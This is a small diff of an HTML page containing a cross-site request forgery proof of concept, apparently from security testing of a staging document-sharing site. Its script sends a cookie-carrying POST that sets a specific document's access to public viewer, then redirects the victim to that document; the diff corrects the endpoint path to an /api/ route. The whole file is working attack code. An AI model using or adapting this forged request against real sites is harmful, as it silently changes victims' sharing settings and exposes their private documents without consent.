@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <script>
 // Minimal CSRF attack - no body, no headers
-fetch('https://staging.textjam.com/doc/KAM7CN17/access/public/viewer', {
+fetch('https://staging.textjam.com/api/doc/KAM7CN17/access/public/viewer', {
     method: 'POST',
     credentials: 'include',  // Send cookies for authentication
     mode: 'no-cors'         // Bypass CORS completely
@@ -12,3 +12,4 @@ setTimeout(() => {
     location.href = 'https://staging.textjam.com/doc/KAM7CN17';
 }, 300);
 </script>
+
